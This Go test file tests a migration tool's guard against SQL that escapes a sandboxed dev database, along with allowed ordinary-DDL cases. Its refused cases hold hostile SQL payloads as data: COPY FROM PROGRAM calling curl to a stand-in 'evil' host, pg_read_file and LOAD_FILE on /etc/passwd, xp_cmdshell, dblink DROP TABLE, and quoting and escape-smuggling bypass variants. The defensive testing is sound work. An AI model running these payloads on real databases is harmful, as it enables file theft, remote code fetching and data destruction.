package atlasschema_test

import (
	"testing"

	qt "github.com/frankban/quicktest"

	"github.com/stokaro/ptah/internal/atlasschema"
)

func TestCheckPlanStatementsSandboxableRefusesEscapes(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		dialect   string
		construct string
	}{
		{
			name:      "sqlite_attach_database",
			statement: `ATTACH DATABASE '/tmp/target.db' AS victim`,
			construct: "ATTACH",
		},
		{
			name:      "sqlite_attach_without_database_keyword",
			statement: `attach '/tmp/target.db' as victim`,
			construct: "ATTACH",
		},
		{
			name:      "sqlite_detach",
			statement: `DETACH DATABASE victim`,
			construct: "DETACH",
		},
		{
			name:      "sqlite_vacuum_into",
			statement: `VACUUM INTO '/tmp/copy.db'`,
			construct: "VACUUM INTO",
		},
		{
			name:      "sqlite_pragma_temp_store_directory",
			statement: `PRAGMA temp_store_directory = '/tmp/evil'`,
			construct: "PRAGMA temp_store_directory",
		},
		{
			// The block itself is ordinary PostgreSQL; what it calls is not.
			name:      "postgres_do_block_calling_dblink",
			statement: "DO $$ BEGIN PERFORM dblink_exec('dbname=target', 'DROP TABLE users'); END $$",
			construct: "dblink",
		},
		{
			name:      "postgres_do_block_copy_from_program",
			statement: "DO $$ BEGIN COPY t FROM PROGRAM 'curl evil'; END $$",
			construct: "COPY ... PROGRAM",
		},
		{
			name:      "postgres_single_quoted_do_block_reading_files",
			statement: `DO 'BEGIN PERFORM pg_read_file(''/etc/passwd''); END' LANGUAGE plpgsql`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_function_body_reading_files",
			statement: "CREATE FUNCTION pwn() RETURNS text AS $$ BEGIN RETURN pg_read_file('/etc/passwd'); END $$ LANGUAGE plpgsql",
			construct: "pg_read_file",
		},
		{
			name:      "postgres_function_body_in_plain_string",
			statement: `CREATE FUNCTION pwn() RETURNS text AS 'SELECT pg_read_file(''/etc/passwd'')' LANGUAGE sql`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_function_body_with_tagged_dollar_quote",
			statement: "CREATE OR REPLACE FUNCTION pwn() RETURNS void AS $body$ BEGIN PERFORM dblink('dbname=target', 'SELECT 1'); END $body$ LANGUAGE plpgsql",
			construct: "dblink",
		},
		{
			name:      "mysql_federated_engine",
			statement: "CREATE TABLE remote_users (id integer) ENGINE=FEDERATED CONNECTION='mysql://user@evil/db/users'",
			construct: "ENGINE=FEDERATED",
		},
		{
			name:      "mysql_create_server",
			statement: `CREATE SERVER evil FOREIGN DATA WRAPPER mysql OPTIONS (HOST 'evil.example', DATABASE 'x')`,
			construct: "CREATE SERVER",
		},
		{
			name:      "mysql_load_file_function",
			statement: `INSERT INTO t (blob_col) VALUES (LOAD_FILE('/etc/passwd'))`,
			construct: "LOAD_FILE",
		},
		{
			name:      "mysql_install_plugin",
			statement: `INSTALL PLUGIN evil SONAME 'evil.so'`,
			construct: "INSTALL PLUGIN",
		},
		{
			name:      "mysql_install_component",
			statement: `INSTALL COMPONENT 'file://component_evil'`,
			construct: "INSTALL COMPONENT",
		},
		{
			name:      "mysql_data_directory",
			statement: `CREATE TABLE t (id integer) DATA DIRECTORY = '/var/evil'`,
			construct: "DATA DIRECTORY",
		},
		{
			name:      "mysql_index_directory",
			statement: `CREATE TABLE t (id integer) INDEX DIRECTORY = '/var/evil'`,
			construct: "INDEX DIRECTORY",
		},
		{
			name:      "mysql_load_data_local_infile",
			statement: `LOAD DATA LOCAL INFILE '/etc/passwd' INTO TABLE users`,
			construct: "LOAD DATA INFILE",
		},
		{
			name:      "mysql_select_into_outfile",
			statement: `SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'`,
			construct: "SELECT ... INTO OUTFILE",
		},
		{
			name:      "mysql_select_into_dumpfile",
			statement: `SELECT payload FROM t INTO DUMPFILE '/tmp/x.so'`,
			construct: "SELECT ... INTO DUMPFILE",
		},
		{
			name:      "postgres_copy_from_program",
			statement: `COPY users FROM PROGRAM 'curl http://evil/x'`,
			construct: "COPY ... PROGRAM",
		},
		{
			name:      "postgres_copy_to_file",
			statement: `COPY users TO '/tmp/users.csv'`,
			construct: "COPY with a file path",
		},
		{
			name:      "postgres_dblink",
			statement: `SELECT * FROM dblink('dbname=target', 'SELECT 1') AS t(x int)`,
			construct: "dblink",
		},
		{
			name:      "postgres_dblink_exec_prefix",
			statement: `SELECT dblink_exec('dbname=target', 'DROP TABLE users')`,
			construct: "dblink",
		},
		{
			name:      "postgres_fdw_extension",
			statement: `CREATE EXTENSION postgres_fdw`,
			construct: "postgres_fdw",
		},
		{
			name:      "postgres_file_fdw_extension",
			statement: `CREATE EXTENSION file_fdw`,
			construct: "file_fdw",
		},
		{
			name:      "postgres_pg_read_file",
			statement: `SELECT pg_read_file('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_qualified_pg_read_file",
			statement: `SELECT pg_catalog.pg_read_file('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "postgres_lo_export",
			statement: `SELECT lo_export(loid, '/tmp/out.bin') FROM t`,
			construct: "lo_export",
		},
		{
			// Quoting a function name does not change which function runs, so
			// the quoted spellings must not be a bypass.
			name:      "double_quoted_pg_read_file",
			statement: `SELECT "pg_read_file"('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "double_quoted_dblink_exec",
			statement: `SELECT "dblink_exec"('dbname=target', 'DROP TABLE users')`,
			construct: "dblink",
		},
		{
			name:      "double_quoted_lo_import",
			statement: `SELECT "lo_import"('/etc/passwd')`,
			construct: "lo_import",
		},
		{
			name:      "double_quoted_qualified_pg_read_file",
			statement: `SELECT "pg_catalog"."pg_read_file"('/etc/passwd')`,
			construct: "pg_read_file",
		},
		{
			name:      "backticked_load_file",
			statement: "INSERT INTO t (c) VALUES (`load_file`('/etc/passwd'))",
			construct: "LOAD_FILE",
		},
		{
			name:      "bracketed_xp_cmdshell",
			statement: `EXEC [xp_cmdshell] 'dir c:\'`,
			dialect:   "sqlserver",
			construct: "xp_cmdshell",
		},
		{
			// Statement-anchored rules must fire on the FIRST statement of a
			// routine body, which has no separator in front of it.
			name:      "first_statement_of_body_copy_program",
			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN COPY t FROM PROGRAM 'curl evil'; END $$ LANGUAGE plpgsql",
			construct: "COPY ... PROGRAM",
		},
		{
			name:      "first_statement_of_body_attach",
			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN ATTACH DATABASE '/tmp/x.db' AS v; END $$ LANGUAGE plpgsql",
			construct: "ATTACH",
		},
		{
			name:      "statement_after_then_in_body",
			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN IF true THEN COPY t FROM PROGRAM 'curl evil'; END IF; END $$ LANGUAGE plpgsql",
			construct: "COPY ... PROGRAM",
		},
		{
			name:      "statement_after_loop_in_body",
			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN LOOP ATTACH DATABASE '/tmp/x.db' AS v; END LOOP; END $$ LANGUAGE plpgsql",
			construct: "ATTACH",
		},
		{
			name:      "dynamic_execute_of_concatenated_prefix",
			statement: "CREATE FUNCTION f() RETURNS void AS $$ BEGIN EXECUTE ('ATTACH DATABASE ''/tmp/x.db'' AS v'); END $$ LANGUAGE plpgsql",
			construct: "ATTACH",
		},
		{
			name:      "sqlserver_bulk_insert",
			statement: `BULK INSERT users FROM 'c:\payload.csv'`,
			dialect:   "sqlserver",
			construct: "BULK INSERT",
		},
		{
			name:      "sqlserver_openrowset",
			statement: `SELECT * FROM OPENROWSET(BULK 'c:\secrets.txt', SINGLE_CLOB) AS x`,
			dialect:   "sqlserver",
			construct: "OPENROWSET",
		},
		{
			name:      "sqlserver_sp_addlinkedserver",
			statement: `EXEC sp_addlinkedserver @server = 'evil'`,
			dialect:   "sqlserver",
			construct: "sp_addlinkedserver",
		},
		{
			name:      "clickhouse_url_engine",
			statement: `CREATE TABLE remote (id UInt64) ENGINE = URL('http://evil/x', CSV)`,
			dialect:   "clickhouse",
			construct: "ClickHouse remote table engine",
		},
		{
			name:      "clickhouse_mysql_engine",
			statement: `CREATE TABLE remote (id UInt64) ENGINE = MySQL('evil:3306', 'db', 'users', 'u', 'p')`,
			dialect:   "clickhouse",
			construct: "ClickHouse remote table engine",
		},
		{
			name:      "sqlite_load_extension",
			statement: `SELECT load_extension('/tmp/evil.so')`,
			construct: "load_extension",
		},
		{
			name:      "sqlite_pragma_schema_qualified_temp_store_directory",
			statement: `PRAGMA main.temp_store_directory = '/tmp/evil'`,
			construct: "PRAGMA temp_store_directory",
		},
		{
			name:      "sqlite_pragma_data_store_directory",
			statement: `PRAGMA data_store_directory = '/tmp/evil'`,
			construct: "PRAGMA data_store_directory",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := qt.New(t)

			err := atlasschema.CheckPlanStatementsSandboxable([]string{
				`CREATE TABLE ok (id integer)`,
				tt.statement,
			}, tt.dialect)

			// The refusal names the offending statement position and the
			// construct, and it must be recognizable as an escape refusal.
			c.Assert(err, qt.IsNotNil)
			c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue)
			c.Assert(err, qt.ErrorMatches,
				`pre-planned migration was refused before it reached the dev database: statement 2 uses `+tt.construct+`, which .*`)
			c.Assert(err, qt.ErrorMatches, `(?s).*A dev database executes plan SQL for real.*`)
		})
	}
}

func TestCheckPlanStatementsSandboxableAllowsOrdinaryDDL(t *testing.T) {
	tests := []struct {
		name      string
		statement string
		dialect   string
	}{
		{
			name:      "table_named_attachment",
			statement: `CREATE TABLE attachment (id integer NOT NULL PRIMARY KEY)`,
		},
		{
			name:      "quoted_table_named_attach",
			statement: `CREATE TABLE "attach" (id integer)`,
		},
		{
			name:      "backticked_column_named_outfile",
			statement: "ALTER TABLE `reports` ADD COLUMN `outfile` text",
		},
		{
			name:      "quoted_column_named_infile",
			statement: `ALTER TABLE reports ADD COLUMN "infile" text`,
		},
		{
			// Bare, unquoted names that merely collide with the keywords:
			// INTO OUTFILE is the escape, the word alone is not.
			name:      "bare_column_named_outfile",
			statement: `ALTER TABLE reports ADD COLUMN outfile text`,
		},
		{
			name:      "bare_column_named_dumpfile",
			statement: `ALTER TABLE reports ADD COLUMN dumpfile text`,
		},
		{
			name:      "bare_column_named_infile",
			statement: `ALTER TABLE reports ADD COLUMN infile text`,
		},
		{
			// The table name is followed by `(`, which is a DDL name
			// position, not a dblink call site.
			name:      "table_named_dblink_events",
			statement: `CREATE TABLE dblink_events (id integer NOT NULL PRIMARY KEY, note text)`,
		},
		{
			name:      "table_named_dblink_events_if_not_exists",
			statement: `CREATE TABLE IF NOT EXISTS dblink_events (id integer)`,
		},
		{
			name:      "insert_into_table_named_dblink_events",
			statement: `INSERT INTO dblink_events (id) VALUES (1)`,
		},
		{
			name:      "column_named_dblink_url",
			statement: `ALTER TABLE services ADD COLUMN dblink_url text`,
		},
		{
			name:      "index_named_lo_import",
			statement: `CREATE INDEX lo_import ON objects (name)`,
		},
		{
			name:      "index_named_pg_read_file",
			statement: `CREATE INDEX pg_read_file ON objects (name)`,
		},
		{
			name:      "bracket_quoted_outfile_column",
			statement: `ALTER TABLE reports ADD COLUMN [outfile] nvarchar(100)`,
			dialect:   "sqlserver",
		},
		{
			name:      "bracket_quoted_dblink_table",
			statement: `CREATE TABLE [dblink] (id int)`,
			dialect:   "sqlserver",
		},
		{
			name:      "bracket_quoted_identifier_containing_semicolon_and_attach",
			statement: `CREATE TABLE [a;ATTACH] (id int)`,
			dialect:   "sqlserver",
		},
		{
			name:      "string_literal_containing_attach",
			statement: `INSERT INTO notes (body) VALUES ('please ATTACH DATABASE later')`,
		},
		{
			name:      "string_literal_containing_copy_program",
			statement: `ALTER TABLE t ADD COLUMN note text DEFAULT 'COPY x FROM PROGRAM ls'`,
		},
		{
			name:      "comment_mentioning_attach",
			statement: "-- ATTACH DATABASE '/tmp/x.db' AS y\nCREATE TABLE ok (id integer)",
		},
		{
			name:      "copy_from_stdin_has_no_file_argument",
			statement: `COPY users (id, name) FROM STDIN`,
		},
		{
			name:      "ordinary_create_index",
			statement: `CREATE INDEX idx_posts_user_id ON posts (user_id)`,
		},
		{
			name:      "column_named_program",
			statement: `CREATE TABLE jobs (program text NOT NULL)`,
		},
		{
			name:      "column_named_directory",
			statement: `CREATE TABLE data (directory text NOT NULL)`,
		},
		{
			name:      "vacuum_without_into",
			statement: `VACUUM`,
		},
		{
			name:      "pragma_foreign_keys",
			statement: `PRAGMA foreign_keys = ON`,
		},
		{
			name:      "plain_function_without_escapes",
			statement: "CREATE FUNCTION bump() RETURNS integer AS $$ BEGIN RETURN 1; END $$ LANGUAGE plpgsql",
		},
		{
			// Ordinary PL/pgSQL: message text and column values inside a
			// routine body are data, not statements, and must not be scanned
			// as SQL. Scanning them refused perfectly normal schemas.
			name:      "routine_body_raise_exception_message",
			statement: "CREATE FUNCTION guard() RETURNS trigger AS $$ BEGIN RAISE EXCEPTION 'Do not delete rows from this table'; END $$ LANGUAGE plpgsql",
		},
		{
			name:      "routine_body_raise_notice_mentioning_copy_to",
			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'Copy to ''archive'' complete'; END $$ LANGUAGE plpgsql",
		},
		{
			name:      "routine_body_insert_value_mentioning_attach",
			statement: "CREATE FUNCTION seed() RETURNS void AS $$ BEGIN INSERT INTO docs (body) VALUES ('ATTACH the receipt here'); END $$ LANGUAGE plpgsql",
		},
		{
			name:      "routine_body_default_mentioning_engine_federated",
			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'ENGINE=FEDERATED is not used here'; END $$ LANGUAGE plpgsql",
		},
		{
			name:      "routine_body_message_mentioning_load_data_infile",
			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'LOAD DATA INFILE is forbidden'; END $$ LANGUAGE plpgsql",
		},
		{
			name:      "routine_body_message_mentioning_do_block",
			statement: "CREATE FUNCTION note() RETURNS void AS $$ BEGIN RAISE NOTICE 'DO NOT RUN THIS IN PRODUCTION'; END $$ LANGUAGE plpgsql",
		},
		{
			// Adjacency false positives: none of these carries a path or an
			// engine assignment, so none is the dangerous construct.
			name:      "insert_into_table_named_outfile",
			statement: `INSERT INTO outfile (id) VALUES (1)`,
		},
		{
			name:      "select_into_table_named_outfile",
			statement: `SELECT * INTO outfile FROM src`,
		},
		{
			name:      "index_named_directory",
			statement: `CREATE INDEX directory ON files (path)`,
		},
		{
			name:      "columns_named_engine_and_federated",
			statement: `INSERT INTO cfg (engine, federated) VALUES ('innodb', 1)`,
		},
		{
			name:      "column_named_data_of_type_directory",
			statement: `CREATE TABLE t (data directory)`,
		},
		{
			name:      "table_named_bulk_with_insert_column",
			statement: `CREATE TABLE bulk (insert_count integer)`,
		},
		{
			// The idempotent-DDL idiom every PostgreSQL plan is full of. An
			// anonymous block is not an escape; refusing it wholesale broke
			// the interop this reader exists for.
			name: "postgres_do_block_idempotent_create_type",
			statement: "DO $$ BEGIN IF NOT EXISTS (SELECT 1 FROM pg_type WHERE typname = 'status') " +
				`THEN CREATE TYPE "status" AS ENUM ('a'); END IF; END $$`,
		},
		{
			name: "postgres_do_block_duplicate_column_guard",
			statement: "DO $$ BEGIN ALTER TABLE users ADD COLUMN email text; " +
				"EXCEPTION WHEN duplicate_column THEN NULL; END $$",
		},
		{
			name:      "postgres_do_block_plain_ddl",
			statement: "DO $$ BEGIN CREATE INDEX idx_users_email ON users (email); END $$",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			c := qt.New(t)

			err := atlasschema.CheckPlanStatementsSandboxable([]string{tt.statement}, tt.dialect)

			c.Assert(err, qt.IsNil)
		})
	}
}

func TestCheckPlanStatementsSandboxableScansBothStringEscapeDialects(t *testing.T) {
	c := qt.New(t)

	// Under MySQL-family backslash escapes the literal ends at the escaped
	// quote and ATTACH is code; under PostgreSQL rules the same bytes parse
	// differently. Scanning both interpretations means neither reading can
	// smuggle an escape past the guard.
	statement := `INSERT INTO t VALUES ('\'); ATTACH DATABASE '/tmp/x.db' AS y; --')`

	err := atlasschema.CheckPlanStatementsSandboxable([]string{statement}, "mysql")

	c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue, qt.Commentf("err=%v", err))
}

func TestCheckPlanStatementsSandboxableScansNestedRoutineBodies(t *testing.T) {
	c := qt.New(t)

	// A routine body that builds another routine still gets scanned.
	statement := "CREATE FUNCTION outer_fn() RETURNS void AS $outer$ BEGIN " +
		"EXECUTE 'CREATE FUNCTION inner_fn() RETURNS text AS $inner$ BEGIN RETURN pg_read_file(''/etc/passwd''); END $inner$ LANGUAGE plpgsql'; " +
		"END $outer$ LANGUAGE plpgsql"

	err := atlasschema.CheckPlanStatementsSandboxable([]string{statement}, "postgres")

	c.Assert(atlasschema.IsPlanEscape(err), qt.IsTrue, qt.Commentf("err=%v", err))
}

func TestCheckPlanStatementsSandboxableAcceptsEmptyInput(t *testing.T) {
	c := qt.New(t)

	c.Assert(atlasschema.CheckPlanStatementsSandboxable(nil, "sqlite"), qt.IsNil)
	c.Assert(atlasschema.CheckPlanStatementsSandboxable([]string{"", "   "}, "sqlite"), qt.IsNil)
}
